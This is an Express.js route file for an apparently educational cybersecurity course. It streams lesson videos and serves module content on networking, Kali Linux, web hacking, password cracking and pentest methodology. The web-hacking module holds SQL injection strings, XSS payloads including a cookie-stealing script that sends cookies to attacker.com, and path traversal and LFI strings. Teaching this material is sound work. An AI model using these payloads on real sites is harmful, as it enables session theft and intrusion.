const express = require('express');
const router = express.Router();
const { protect } = require('../middleware/auth');
const fs = require('fs');
const path = require('path');

// ── Video streaming endpoint ──────────────────────────────
// Streams videos from the "CYBER VEDIOES" folder on disk.
// Supports HTTP Range requests so the browser seek bar works.
router.get('/video/:filename', protect, (req, res) => {
  const filename = decodeURIComponent(req.params.filename);
  // Prevent path traversal
  const safe = path.basename(filename);
  const videoPath = path.join(__dirname, '../../CYBER VEDIOES', safe);

  if (!fs.existsSync(videoPath)) {
    return res.status(404).json({ success: false, message: 'Video not found' });
  }

  const stat = fs.statSync(videoPath);
  const fileSize = stat.size;
  const range = req.headers.range;

  if (range) {
    // Partial content — enables seek
    const parts = range.replace(/bytes=/, '').split('-');
    const start = parseInt(parts[0], 10);
    const end = parts[1] ? parseInt(parts[1], 10) : fileSize - 1;
    const chunkSize = end - start + 1;
    const file = fs.createReadStream(videoPath, { start, end });
    res.writeHead(206, {
      'Content-Range': `bytes ${start}-${end}/${fileSize}`,
      'Accept-Ranges': 'bytes',
      'Content-Length': chunkSize,
      'Content-Type': 'video/mp4',
    });
    file.pipe(res);
  } else {
    // Full file
    res.writeHead(200, {
      'Content-Length': fileSize,
      'Content-Type': 'video/mp4',
      'Accept-Ranges': 'bytes',
    });
    fs.createReadStream(videoPath).pipe(res);
  }
});

const learningModules = [
  {
    id: 1, title: 'What is Cybersecurity?', category: 'fundamentals', level: 'beginner',
    duration: '20 min', xp: 50, icon: '🛡️',
    video: 'https://www.youtube.com/embed/inWWhr5tnEA',
    videoType: 'youtube',
    content: {
      overview: 'Cybersecurity is the practice of protecting systems, networks, and programs from digital attacks. These cyberattacks are usually aimed at accessing, changing, or destroying sensitive information.',
      sections: [
        { title: 'Types of Threats', body: 'Malware, Phishing, Man-in-the-Middle attacks, Denial-of-Service, SQL Injection, Zero-day exploits, Social Engineering, Ransomware.' },
        { title: 'CIA Triad', body: 'The foundation of cybersecurity:\n• Confidentiality: Protecting data from unauthorized access\n• Integrity: Ensuring data is accurate and untampered\n• Availability: Ensuring systems are accessible when needed' },
        { title: 'Types of Hackers', body: '• White Hat: Ethical hackers who help organizations\n• Black Hat: Malicious hackers who exploit systems illegally\n• Grey Hat: Between ethical and malicious\n• Script Kiddies: Beginners using pre-made tools\n• Nation State: Government-sponsored hackers' },
        { title: 'Career Paths', body: '• Penetration Tester\n• Security Analyst\n• Incident Responder\n• Malware Analyst\n• Security Engineer\n• CISO (Chief Information Security Officer)' }
      ]
    }
  },
  {
    id: 2, title: 'Kali Linux Complete Setup', category: 'kali-linux', level: 'beginner',
    duration: '45 min', xp: 150, icon: '🐉',
    content: {
      overview: 'Kali Linux is the most popular Linux distribution for penetration testing and ethical hacking. Built on Debian, it comes pre-installed with 600+ security tools.',
      sections: [
        { title: 'Installation Methods', body: '1. Bare Metal: Install directly on hardware (best performance)\n2. VirtualBox/VMware: Run in a VM (safest for beginners)\n3. WSL2: Windows Subsystem for Linux (Windows users)\n4. Raspberry Pi: Portable hacking device\n5. Live USB: Boot without installation' },
        { title: 'System Requirements', body: 'Minimum:\n• CPU: 2 GHz dual-core\n• RAM: 2 GB (4 GB recommended)\n• Storage: 20 GB (50 GB recommended)\n• Network adapter for wireless testing\n\nRecommended for labs:\n• RAM: 8 GB\n• Storage: 100 GB SSD\n• Dedicated WiFi adapter (Alfa AWUS036ACH)' },
        { title: 'First Boot Configuration', body: 'After installation:\n1. Update system: sudo apt update && sudo apt upgrade -y\n2. Install additional tools: sudo apt install kali-linux-large\n3. Configure network: nmtui\n4. Set up SSH: sudo systemctl enable ssh\n5. Change default password: passwd' },
        { title: 'Important Directories', body: '/etc/passwd - User accounts\n/etc/shadow - Password hashes\n/var/log - System logs\n/usr/share/wordlists - Password lists (rockyou.txt)\n/usr/share/nmap/scripts - Nmap NSE scripts\n/opt - Third-party tools\n/home/kali - Your home directory' }
      ]
    }
  },
  {
    id: 3, title: 'Network Fundamentals for Hackers', category: 'networking', level: 'beginner',
    duration: '60 min', xp: 200, icon: '🌐',
    content: {
      overview: 'Understanding networking is essential for cybersecurity. You need to understand how data flows through networks to understand how attacks work.',
      sections: [
        { title: 'OSI Model', body: '7 - Application (HTTP, FTP, DNS)\n6 - Presentation (SSL/TLS, Encryption)\n5 - Session (NetBIOS, RPC)\n4 - Transport (TCP, UDP) - Ports live here\n3 - Network (IP, ICMP, ARP) - Routing\n2 - Data Link (Ethernet, MAC)\n1 - Physical (Cables, Radio waves)\n\nRemember: All People Seem To Need Data Processing' },
        { title: 'TCP/IP & Ports', body: 'Common ports to memorize:\n• 21 - FTP\n• 22 - SSH\n• 23 - Telnet\n• 25 - SMTP\n• 53 - DNS\n• 80 - HTTP\n• 443 - HTTPS\n• 3306 - MySQL\n• 3389 - RDP\n• 8080 - HTTP Alt' },
        { title: 'IP Addressing', body: 'Private IP ranges:\n• 10.0.0.0/8 (Class A)\n• 172.16.0.0/12 (Class B)\n• 192.168.0.0/16 (Class C)\n\nSpecial addresses:\n• 127.0.0.1 - Localhost\n• 0.0.0.0 - All interfaces\n• 255.255.255.255 - Broadcast' },
        { title: 'Protocols to Know', body: 'ARP - Maps IP to MAC (ARP poisoning attacks)\nDNS - Resolves domain names (DNS poisoning)\nHTTP/HTTPS - Web traffic (session hijacking)\nSSH - Secure remote access\nSMB - Windows file sharing (EternalBlue)\nSNMP - Network device management' }
      ]
    }
  },
  {
    id: 4, title: 'Web Application Hacking', category: 'web-security', level: 'intermediate',
    duration: '90 min', xp: 300, icon: '🕸️',
    content: {
      overview: 'Web application vulnerabilities are the most common attack vector. The OWASP Top 10 lists the most critical security risks.',
      sections: [
        { title: 'OWASP Top 10', body: '1. Broken Access Control\n2. Cryptographic Failures\n3. Injection (SQL, Command, LDAP)\n4. Insecure Design\n5. Security Misconfiguration\n6. Vulnerable Components\n7. Auth/Identity Failures\n8. Software & Data Integrity Failures\n9. Logging & Monitoring Failures\n10. Server-Side Request Forgery (SSRF)' },
        { title: 'SQL Injection', body: "Attack: Inserting SQL code into input fields\n\nBasic bypass: ' OR '1'='1\nComment out: admin'--\nUnion attack: ' UNION SELECT 1,2,3--\nBlind SQLi: ' AND SLEEP(5)--\n\nPrevention: Parameterized queries, input validation, WAF" },
        { title: 'XSS (Cross-Site Scripting)', body: 'Types:\n• Reflected XSS: Payload in URL\n• Stored XSS: Payload in database\n• DOM XSS: Client-side script manipulation\n\nPayloads:\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\nStealing cookies:\n<script>document.location=\'http://attacker.com/?\'+document.cookie</script>' },
        { title: 'Directory Traversal & LFI', body: 'Path traversal: ../../../etc/passwd\nURL encoded: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd\nDouble encoded: %252e%252e%252f\n\nLFI to RCE:\n1. Include /var/log/apache2/access.log (log poisoning)\n2. Include /proc/self/environ\n3. PHP wrappers: php://filter/convert.base64-encode/resource=index.php' }
      ]
    }
  },
  {
    id: 5, title: 'Password Cracking Techniques', category: 'password-security', level: 'intermediate',
    duration: '75 min', xp: 250, icon: '🔑',
    content: {
      overview: 'Password cracking is the process of recovering passwords from stored or transmitted data. Understanding this helps you build better defenses.',
      sections: [
        { title: 'Hash Types', body: 'MD5 (128-bit) - Weak, avoid!\nSHA-1 (160-bit) - Deprecated\nSHA-256/512 - Better\nbcrypt - Strong, uses salt\nArgon2 - Best for passwords\nNTLM - Windows passwords\n\nIdentify hashes:\nhashid hash.txt\nhash-identifier' },
        { title: 'Attack Methods', body: 'Dictionary Attack: Try words from a wordlist\nBrute Force: Try all combinations\nRule-based: Apply transformations (pa$$w0rd)\nRainbow Tables: Pre-computed hash tables\nMask Attack: Pattern like ?u?l?l?l?d?d (Upper+lower+digits)\nHybrid: Dictionary + brute force' },
        { title: 'Wordlists', body: 'Best wordlists:\n• /usr/share/wordlists/rockyou.txt (14M passwords)\n• SecLists (github.com/danielmiessler/SecLists)\n• CrackStation wordlist (1.5B words)\n• Custom wordlists with CeWL\n\nGenerate custom: cewl http://target.com -d 2 -m 5 -w custom.txt' },
        { title: 'Hashcat Rules', body: 'Rules transform dictionary words:\nhashcat -r rules/best64.rule hash.txt wordlist.txt\n\nCommon rules:\n• best64.rule - 64 best transformations\n• d3ad0ne.rule - Complex rules\n• OneRuleToRuleThemAll.rule - Most comprehensive\n\nCreate custom rule:\nl (lowercase) u (uppercase) c (capitalize)\n$1 (append 1) ^! (prepend !) T3 (toggle case pos 3)' }
      ]
    }
  },
  {
    id: 6, title: 'Penetration Testing Methodology', category: 'pentest', level: 'advanced',
    duration: '120 min', xp: 400, icon: '⚔️',
    content: {
      overview: 'Professional penetration testing follows a structured methodology to ensure thorough coverage and legal compliance. Never test without written authorization!',
      sections: [
        { title: 'Phases of Pentest', body: '1. Planning & Reconnaissance\n   - Scope definition\n   - Rules of engagement\n   - Passive OSINT\n\n2. Scanning & Enumeration\n   - Port scanning\n   - Service fingerprinting\n   - Vulnerability scanning\n\n3. Exploitation\n   - Gaining initial access\n   - Exploiting vulnerabilities\n\n4. Post-Exploitation\n   - Privilege escalation\n   - Lateral movement\n   - Persistence\n\n5. Reporting\n   - Document all findings\n   - Risk ratings\n   - Remediation advice' },
        { title: 'Reconnaissance Tools', body: 'Passive OSINT:\n• theHarvester - Email, domains, IPs\n• Maltego - Visual link analysis\n• Shodan - Internet-connected devices\n• WHOIS - Domain registration info\n• DNSrecon - DNS enumeration\n\nActive Reconnaissance:\n• Nmap - Port/service scanning\n• Nikto - Web vulnerabilities\n• Gobuster - Directory enumeration\n• Enum4linux - SMB enumeration' },
        { title: 'Privilege Escalation', body: 'Linux PrivEsc:\n• sudo -l (check sudo permissions)\n• find / -perm -4000 (SUID files)\n• crontab -l (scheduled tasks)\n• LinPEAS/LinEnum scripts\n• GTFObins (https://gtfobins.github.io)\n\nWindows PrivEsc:\n• whoami /priv (check privileges)\n• winPEAS script\n• PowerSploit\n• Unquoted service paths' },
        { title: 'Report Writing', body: 'Executive Summary:\n• High-level overview for management\n• Business impact\n• Risk ratings (Critical/High/Medium/Low)\n\nTechnical Details:\n• Steps to reproduce\n• Screenshots/evidence\n• CVE references\n• CVSS scores\n\nRemediation:\n• Specific fixes for each finding\n• Prioritized by risk\n• Timeline recommendations' }
      ]
    }
  }
];

router.get('/', protect, (req, res) => {
  const modules = learningModules.map(m => ({ id: m.id, title: m.title, category: m.category, level: m.level, duration: m.duration, xp: m.xp, icon: m.icon }));
  res.json({ success: true, modules });
});

router.get('/:id', protect, (req, res) => {
  const module = learningModules.find(m => m.id === parseInt(req.params.id));
  if (!module) return res.status(404).json({ success: false, message: 'Module not found' });
  res.json({ success: true, module });
});

module.exports = router;
